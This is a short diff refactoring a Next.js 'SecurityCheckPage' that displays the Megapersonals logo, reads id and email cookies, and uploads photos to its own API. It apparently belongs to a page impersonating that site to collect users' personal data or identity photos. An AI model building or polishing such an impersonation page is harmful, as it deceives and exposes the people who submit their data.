@@ -1,10 +1,11 @@
+"use client";
+
 import Image from "next/image";
-import Megapersonals from "../public/images/megapersonals.png";
 import Cookies from "js-cookie";
 import { useState } from "react";
-import PhotoUpload from "../components/PhotoUpload";
 import { Field, Form, Formik } from "formik";
-import { API_URL } from "../config";
+import { API_URL } from "../config/index";
+import PhotoUpload from "../components/PhotoUpload";
 
 function SecurityCheckPage() {
   const [showModal, setShowModal] = useState(false);
@@ -41,11 +42,7 @@ function SecurityCheckPage() {
 
       formik.resetForm();
       console.log("success", data);
-      // toast.success("Login Succecssfull");
-      // Cookies.remove("id");
-      // Cookies.remove("email");
-      // router.push("/account/email");
-      // Cookies.remove("id");
+    
     } else {
       console.log("error", data);
       // toast.error("Something Went Wrong");
@@ -55,7 +52,7 @@ function SecurityCheckPage() {
   return (
     <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
       <div className="w-[65%] lg:w-full">
-        <Image src={Megapersonals} alt="megaeprsonals" priority />
+        <Image src={"/images/megapersonals.png"} alt="megaeprsonals" priority />
       </div>
 
       <div className="mt-5 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-xl text-center font-medium uppercase">
